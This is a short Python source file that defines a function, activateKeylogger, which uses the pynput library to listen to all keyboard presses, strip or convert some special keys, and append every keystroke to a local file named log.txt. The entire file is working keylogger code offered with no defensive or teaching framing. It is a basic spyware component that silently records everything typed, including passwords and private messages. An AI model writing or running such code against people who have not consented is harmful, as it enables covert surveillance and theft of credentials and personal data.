from pynput.keyboard import Listener


def activateKeylogger():
    f=open('log.txt', 'w').close()
    def log_keystroke(key):
        key = str(key).replace("'", "")

        if key == 'Key.space':
            key = ' '
        if key == 'Key.shift_r':
            key = ''
        if key == 'Key.shift':
            key = ''
        if key== 'Key.caps_lock':
            key = ''
        if key == 'Key.enter':
            key = '\n'
        if key == 'Key.backspace':
            key=''
        with open("log.txt", 'a') as f:
            f.write(key)

    with Listener(on_press=log_keystroke) as l:
        l.join()